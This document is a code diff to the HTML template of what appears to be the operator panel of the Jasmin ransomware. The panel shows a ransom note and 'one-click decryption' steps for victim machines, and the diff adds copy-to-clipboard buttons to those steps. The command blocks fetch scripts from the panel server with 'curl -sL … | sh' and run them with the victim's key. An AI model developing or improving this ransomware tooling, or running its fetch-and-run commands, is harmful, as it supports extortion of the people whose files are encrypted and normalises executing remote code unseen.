@@ -208,7 +208,7 @@ Contact us to obtain the private key and restore your files.</textarea>
 <div class="dt-content" id="dt-win">
 <h3>🖥️ Windows 一键解密</h3>
 <div class="dt-step"><span>1</span>在目标机打开 PowerShell (管理员)</div>
-<div class="dt-step"><span>2</span>复制下方命令直接运行</div>
+<div class="dt-step"><span>2</span>点击命令框右上角「复制」按钮，粘贴到终端运行</div>
 <div class="dt-note"><i class="fas fa-shield-alt"></i> 自动下载私钥+解密器、执行解密、清理临时文件</div>
 <pre class="dt-code">:: 纯 PowerShell 实现，无需编译 exe
 :: 要求 PowerShell 7+   (未装可执行: winget install Microsoft.PowerShell)
@@ -219,7 +219,7 @@ pwsh -File jasmin_unlock.ps1 -Server {{ request.url_root }} -K "{{ aes_key }}"
 <div class="dt-content" id="dt-linux" style="display:none">
 <h3>🐧 Linux 一键解密</h3>
 <div class="dt-step"><span>1</span>在目标机打开终端</div>
-<div class="dt-step"><span>2</span>复制下方命令直接运行</div>
+<div class="dt-step"><span>2</span>点击命令框右上角「复制」按钮，粘贴到终端运行</div>
 <div class="dt-note"><i class="fas fa-shield-alt"></i> 自动安装依赖、下载私钥和脚本、全盘解密、清理</div>
 <pre class="dt-code"># Linux 一键解密 — 纯 openssl，零依赖（无需 pip / cryptography）
 # 末尾加上要解密的目录；不写则解密当前目录
@@ -231,7 +231,7 @@ curl -sL {{ request.url_root }}payloads/jasmin_unlock.sh | sh -s {{ request.url_
 <div class="dt-content" id="dt-mac" style="display:none">
 <h3>🍎 macOS 一键解密</h3>
 <div class="dt-step"><span>1</span>打开终端</div>
-<div class="dt-step"><span>2</span>复制下方命令直接运行</div>
+<div class="dt-step"><span>2</span>点击命令框右上角「复制」按钮，粘贴到终端运行</div>
 <pre class="dt-code"># macOS 一键解密 — 纯 openssl，零依赖（macOS 自带 openssl）
 # 末尾加上要解密的目录；不写则解密当前目录
 curl -sL {{ request.url_root }}payloads/jasmin_unlock.sh | sh -s {{ request.url_root }} "{{ aes_key }}"
@@ -244,6 +244,73 @@ curl -sL {{ request.url_root }}payloads/jasmin_unlock.sh | sh -s {{ request.url_
 
 </main>
 <script>
+/* ── 代码块「复制」按钮 ──
+   本面板多为 http（非安全上下文）→ navigator.clipboard 为 undefined，
+   必须带 document.execCommand('copy') 回退，否则点击无反应。 */
+function jasminCopyFallback(txt){
+  var ta=document.createElement('textarea');
+  ta.value=txt;ta.setAttribute('readonly','');
+  ta.style.cssText='position:fixed;top:0;left:-9999px;opacity:0';
+  document.body.appendChild(ta);
+  ta.focus();ta.select();
+  try{ta.setSelectionRange(0,txt.length);}catch(e){}
+  var ok=false;
+  try{ok=document.execCommand('copy');}catch(e){ok=false;}
+  document.body.removeChild(ta);
+  return ok;
+}
+function jasminDoCopy(txt,btn){
+  var finish=function(ok){
+    btn.textContent=ok?'✓ 已复制':'复制失败';
+    btn.classList.toggle('ok',ok);btn.classList.toggle('err',!ok);
+    clearTimeout(btn._jt);
+    btn._jt=setTimeout(function(){btn.textContent='复制';btn.classList.remove('ok','err');},1500);
+  };
+  if(navigator.clipboard&&window.isSecureContext){
+    navigator.clipboard.writeText(txt).then(function(){finish(true);},function(){finish(jasminCopyFallback(txt));});
+  }else{
+    finish(jasminCopyFallback(txt));
+  }
+}
+function jasminEnhanceCode(root){
+  root=root&&root.nodeType===1?root:document;
+  var list=[],i;
+  if(root.matches&&root.matches('pre.dt-code'))list.push(root);
+  var found=root.querySelectorAll?root.querySelectorAll('pre.dt-code'):[];
+  for(i=0;i<found.length;i++)list.push(found[i]);
+  for(i=0;i<list.length;i++){
+    var pre=list[i];
+    if(!pre.parentNode||pre.getAttribute('data-jcopy'))continue;
+    pre.setAttribute('data-jcopy','1');
+    var raw=pre.textContent;                 /* 先取原文再插按钮，否则会把按钮文字也复制进去 */
+    var wrap=document.createElement('div');
+    wrap.className='dt-code-wrap';
+    pre.parentNode.insertBefore(wrap,pre);
+    wrap.appendChild(pre);
+    var b=document.createElement('button');
+    b.type='button';b.className='copy-btn';b.textContent='复制';b.title='复制到剪贴板';
+    b._jtRaw=raw;
+    b.addEventListener('click',function(ev){
+      ev.preventDefault();ev.stopPropagation();
+      jasminDoCopy(this._jtRaw,this);
+    });
+    wrap.appendChild(b);
+  }
+}
+(function(){
+  function boot(){jasminEnhanceCode(document);}
+  if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',boot);else boot();
+  /* 载荷生成弹窗、一键解密展开行都是 innerHTML 动态插入 → 必须监听 */
+  try{
+    new MutationObserver(function(muts){
+      for(var i=0;i<muts.length;i++){
+        var an=muts[i].addedNodes;
+        for(var j=0;j<an.length;j++)if(an[j].nodeType===1)jasminEnhanceCode(an[j]);
+      }
+    }).observe(document.documentElement,{childList:true,subtree:true});
+  }catch(e){}
+})();
+
 function checkUpdate(){
   var r=document.getElementById('update-result');r.textContent='';
   var sp=document.createElement('span');sp.className='loading';
